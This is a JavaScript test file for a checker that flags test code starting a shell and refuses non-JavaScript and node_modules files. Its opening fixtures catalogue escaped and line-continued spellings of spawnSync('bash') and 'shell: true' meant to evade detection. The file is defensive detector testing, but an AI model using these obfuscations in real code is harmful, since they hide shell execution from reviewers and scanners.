    ["a continuation with a lone CR", 'spawnSync("bas\\\rh", ["-c", script]);'],
    ["a continuation with U+2028", 'spawnSync("bas\\\u2028h", ["-c", script]);'],
    ["a continuation before the closing quote", 'spawnSync("bash\\\n");'],
    ["a continuation in a template literal", "execFileSync(`bas\\\nh`, []);"],
    ["a continuation and an escape together", 'spawnSync("b\\\n\\x61sh");'],
    ["a continuation in a quoted shell option key", 'spawnSync(f, { "she\\\nll": true });'],
    ["a \\x escape", 'spawnSync("\\x62ash", ["-c", script]);'],
    ["a \\x escape in the middle", 'spawnSync("ba\\x73h");'],
    ["a \\u escape", 'spawnSync("ba\\u0073h", ["-c", script]);'],
    ["a \\u{} escape", 'spawnSync("ba\\u{73}h");'],
    ["a long \\u{} escape", 'spawnSync("ba\\u{000073}h");'],
    ["a \\u{} escape with more than eight digits", 'spawnSync("ba\\u{0000000073}h");'],
    ["an upper-case hex escape", 'spawnSync("\\x62\\x61\\x73\\x68");'],
    ["an octal escape", 'spawnSync("\\142ash");'],
    ["an escape in the /bin path", 'spawnSync("/bin/\\x62ash");'],
    ["an escaped slash in the /bin path", 'spawnSync("env", ["\\/bin\\/sh -c true"]);'],
    ["a shell option key spelled with \\u", "spawnSync(file, { sh\\u0065ll: true });"],
    ["a shell option key spelled with \\x", 'spawnSync(file, { "\\x73hell": true });'],
    ["a shell option set on a variable", 'options["sh\\u{65}ll"] = true;'],
    ["SHELL spelled with an escape", "const s = process.env.SH\\u0045LL;"],
    ["execSync spelled with an escape", 'cp.\\u0065xecSync("true");'],
    ["a backslash before a plain letter", 'spawnSync(file, { "s\\hell": true });'],
    ["a backslash before most letters", 'spawnSync("b\\a\\s\\h");'],
    ["env and a hidden shell", "spawnSync('env', ['b\\x61sh']);"],
    ["a shebang with an escape", '"#!/usr/bin/env b\\u0061sh",'],
  ]) assert.equal(startsAShell("x.mjs", source).length, 1, `${label}: ${JSON.stringify(source)}`);
});

test("a continuation is joined and an escape decoded without false findings, and the line is reported where it starts (#576)", () => {
  const joined = startsAShell("x.mjs", 'a();\nspawnSync("bas\\\nh");\nb();');
  assert.equal(joined.length, 1);
  assert.ok(joined[0].startsWith("x.mjs:2 names a shell at the end of a string literal: "), joined[0]);
  assert.ok(startsAShell("x.mjs", 'a();\nb();\nspawnSync("\\x62ash");')[0].startsWith("x.mjs:3 "));
  // An escaped backslash before a line break is not a continuation: the next line stands alone.
  const separate = startsAShell("x.mjs", 'const a = "end\\\\";\nspawnSync("bash");');
  assert.equal(separate.length, 1);
  assert.ok(separate[0].startsWith("x.mjs:2 "), separate[0]);
  // A last line ending in a backslash is still read.
  assert.equal(startsAShell("x.mjs", 'spawnSync("bash");\\').length, 1);
  // An allowed line is matched by its source text: the joined lines, escapes as written.
  const allowedLine = 'const shell = docker(["run", "--entrypoint", "/bin/\\x73h", image]);';
  assert.equal(startsAShell("x.mjs", allowedLine).length, 1);
  assert.deepEqual(startsAShell("x.mjs", allowedLine, [allowedLine]), []);
  assert.deepEqual(startsAShell("x.mjs", 'const path = "/bin/s\\\nh";', ['const path = "/bin/sh";']), [], "caught only when joined: listed as joined");
  // A comment that ends in a backslash does not continue: the next line is code, and is
  // judged (and allowed) as the line it is. The rule before #576 saw these too.
  const comment = startsAShell("x.mjs", '// see C:\\dir\\\nexecSync("true");');
  assert.equal(comment.length, 1);
  assert.ok(comment[0].startsWith("x.mjs:2 calls exec() or execSync(): execSync("), comment[0]);
  assert.equal(startsAShell("x.mjs", 'spawnSync(file, { encoding: "utf8", // note\\\nshell: !0,\n});').length, 1);
  const listedLine = "while ((m = invocationRe.exec(script))) {";
  assert.deepEqual(startsAShell("x.mjs", `// see C:\\temp\\\n${listedLine}`, [listedLine]), []);
  assert.equal(unescapeSource('"\\u{' + "f".repeat(400) + '}"').length, 406, "an escape beyond Unicode stays as written");
  for (const line of [
    'const text = "\\x41\\u0042\\u{43}\\104\\n\\t";',
    'const note = "push\\x20here";',
    'const word = "\\x70ush";',
    'const word = "pu\\sh";',
    'const say = "say \\"bash\\" now";',
    "const say = 'it\\'s a \\'sh\\' script';",
    // A literal backslash followed by the text of an escape: the string is `\x62ash`.
    'const literal = "\\\\x62ash";',
    'const literal = "\\\\u0073h";',
    "const re = /\\.mjs$/;",
    "const re = /\\bpush\\b/;",
    'const long = "one \\\ntwo";',
    'const nul = "\\0";',
    'const big = "\\u{110000}";',
    'runBash(["-c", "echo \\x68i"]);',
  ]) assert.deepEqual(startsAShell("x.mjs", line), [], line);
});

test("every JavaScript and TypeScript spelling is read, other scripts are refused, and so is node_modules (#576)", () => {
  const scanned = ["a.mjs", "b.js", "c.cjs", "d.mts", "e.cts", "f.ts", "g.tsx", "h.jsx", "sub/i.MTS", "sub/deeper/j.Jsx", "k.d.ts", "l.test.mts"];
  const sorted = sortTestFiles(scanned);
  assert.deepEqual(sorted.scanned, scanned);
  assert.deepEqual(sorted.refused, []);
  // Python tests and data files are not read, as before.
  const unread = ["a.py", "oci_index_test.py", "b.json", "browser/package.json", "c.yaml", "d.yml", "sub/E.YAML"];
  assert.deepEqual(sortTestFiles(unread), { scanned: [], refused: [] });
  // The preflight's own files are the rule's subject, not its object.
  assert.deepEqual(sortTestFiles(["bash-preflight.mjs", "bash-preflight.test.mjs"]), { scanned: [], refused: [] });
  assert.equal(sortTestFiles(["sub/bash-preflight.mjs"]).scanned.length, 1, "only the top-level files are exempt");
  for (const name of ["x.sh", "x.bash", "x.zsh", "x.ksh", "x.fish", "x.pl", "x.rb", "x.php", "x.lua", "x.ps1", "x.bat", "x.cmd", "x.coffee", "x.mjs.sh", "x.sh.json.sh", "x.wasm", "x.node", "x.md", "x.txt", "x.mjs.map", "x.mjsx.bak", "run", "sub/run", "sub/.hidden", ".env", "trailing.mjs.", "x.py.sh"]) {
    const refused = sortTestFiles([name]);
    assert.deepEqual(refused.scanned, [], name);
    assert.equal(refused.refused.length, 1, name);
    assert.ok(refused.refused[0].startsWith(`tests/${name}: `), refused.refused[0]);
  }
  for (const name of ["node_modules/x.mjs", "browser/node_modules/pkg/index.js", "a/node_modules/b.json", "node_modules/p/run.sh", "a/node_modules/x.py"]) {
    const refused = sortTestFiles([name]);
    assert.deepEqual(refused.scanned, [], name);
    assert.equal(refused.refused.length, 1, name);
    assert.match(refused.refused[0], /node_modules/, name);
  }
  assert.equal(sortTestFiles(["node_modules.mjs", "my_node_modules/x.mjs"]).refused.length, 0, "only a directory named node_modules");
});

// The list of files comes from git, so a file added with `git add -f` under an ignored
// node_modules is listed, and an ignored one that was never added is not (#576).
test("a force-added file under tests/node_modules is listed and refused, an ignored one is not (#576)", t => {
  const repo = scratch(t);
  const git = (...args) => {
    const result = spawnSync("git", args, { cwd: repo, encoding: "utf8", env: gitEnv() });
    assert.equal(result.status, 0, `git ${args.join(" ")}: ${result.stderr}`);
  };
  git("init", "--quiet");
  mkdirSync(join(repo, "tests/node_modules/pkg"), { recursive: true });
  mkdirSync(join(repo, "tests/browser/node_modules"), { recursive: true });
  mkdirSync(join(repo, "tests/browser/test-results"), { recursive: true });
  writeFileSync(join(repo, ".gitignore"), "node_modules/\ntest-results/\n");
  writeFileSync(join(repo, "tests/ok.test.mjs"), "export {};\n");
  writeFileSync(join(repo, "tests/new.mts"), "export {};\n");
  writeFileSync(join(repo, "tests/node_modules/pkg/index.mjs"), "export {};\n");
  writeFileSync(join(repo, "tests/browser/node_modules/dep.js"), "export {};\n");
  writeFileSync(join(repo, "tests/browser/test-results/trace.zip"), "x");
  git("add", ".gitignore", "tests/ok.test.mjs");
  assert.deepEqual(committableTestFiles(repo).sort(), ["new.mts", "ok.test.mjs"], "ignored files are not listed; an untracked file is");
  assert.deepEqual(sortTestFiles(committableTestFiles(repo)).refused, []);
  git("add", "-f", "tests/node_modules/pkg/index.mjs");
  const listed = committableTestFiles(repo).sort();
  assert.deepEqual(listed, ["new.mts", "node_modules/pkg/index.mjs", "ok.test.mjs"]);
  assert.deepEqual(sortTestFiles(listed).refused, ["tests/node_modules/pkg/index.mjs: a file under node_modules would be committed inside tests/"]);
  // Deleted from the work tree but still in the index: nothing to read.
  rmSync(join(repo, "tests/ok.test.mjs"));
  assert.deepEqual(committableTestFiles(repo).sort(), ["new.mts", "node_modules/pkg/index.mjs"]);
});

// The real path: each suite, started with an old bash first on PATH, must stop before
// its first test with the refusal on stderr. Not a skip, and no fixture has run.
for (const suite of ["tests/supply-chain.test.mjs", "tests/oci-tool.test.mjs"]) {
  test(`${suite} fails before its first test when PATH's bash is too old (#380)`, t => {
    const dir = scratch(t);
    const marker = join(dir, "ran");
    // Reports 3.2; if anything else is ever asked of it, a fixture ran: leave a mark and fail.
    const file = standIn(join(dir, "bin"), `case "$*" in *BASH_VERSINFO*) echo 3.2 ;; *) echo ran >> '${marker}'; exit 0 ;; esac`);
    const env = { ...process.env, PATH: `${join(dir, "bin")}${delimiter}${process.env.PATH}` };
    delete env.NODE_TEST_CONTEXT;
    const result = spawnSync(process.execPath, [join(root, suite)], { cwd: root, env, encoding: "utf8", timeout: 120_000 });
    assert.equal(result.error, undefined, String(result.error));
    assert.equal(result.status, 1, `${result.stdout}\n${result.stderr}`);
    assert.ok(result.stderr.includes(`${NEED}; '${file}' is Bash 3.2`), result.stderr);
    assert.doesNotMatch(result.stdout, /^\s*(?:not )?ok \d/m, "no test may start");
    assert.doesNotMatch(result.stdout, /# (?:SKIP|TODO)/i, "a refusal is not a skip");
    assert.throws(() => readFileSync(marker), { code: "ENOENT" }, "no fixture script may run under the refused shell");
  });
}
